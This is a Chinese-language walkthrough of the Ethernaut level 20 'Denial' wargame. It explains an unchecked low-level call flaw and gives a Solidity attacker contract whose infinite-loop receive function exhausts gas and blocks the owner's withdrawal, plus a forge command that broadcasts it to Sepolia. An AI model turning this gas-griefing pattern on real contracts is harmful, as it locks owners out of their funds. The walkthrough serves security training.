# Level 20

[The Ethernaut level 20](https://ethernaut.openzeppelin.com/level/20)

这一关的目的阻止 `owner` 从 `Denial` 合约中提取（`withdraw`）资金 。

仔细阅读合约，`Denial` 合约，任何人都可以调用 `withdraw` 方法提取资金。每次提取时各自转账 1% 的资金 `partner` 和 `owner`。
转账首先使用 `call` 向 `partner` 转账，没有检查返回值！（这里很关键）。然后 使用 `transfer` 向  `owner` 转账。
要想拒绝 `owner` 提取资金，只需要在向 `partner` 转账时搞点破坏就可以了，比如 `partner` 合约里 `receive` 函数内部的无限循环，交易最终将耗尽 gas 回退。


攻击者合约：
```
contract Attacker {
    uint256 counter = 0;

    constructor() {}

    receive() external payable {
        for (uint256 i = 0; i < 2 ** 256 - 1; i++) {
            counter += 1;
        }
    }
}
```

执行脚本：
```
forge script script/Level20.s.sol:CallContractScript --rpc-url sepolia --broadcast
```

完整代码见：[这里](../../ethernaut/script/Level20.s.sol)

链上记录：
- [level(`Denial`)](https://sepolia.etherscan.io/address/0x1536F390ACb7a8097903F2515b4EEb35a091a633)
- [Attacker(partner)](https://sepolia.etherscan.io/tx/0xAFB2EA284cAb965258c4BC3Dcf10C4b6f9f4728A)
- [attack 交易](https://sepolia.etherscan.io/tx/0xc697d7d3a5c1fdcaaa7545671af0c738b48984c82ca8de22f7ed7b23e001c09e)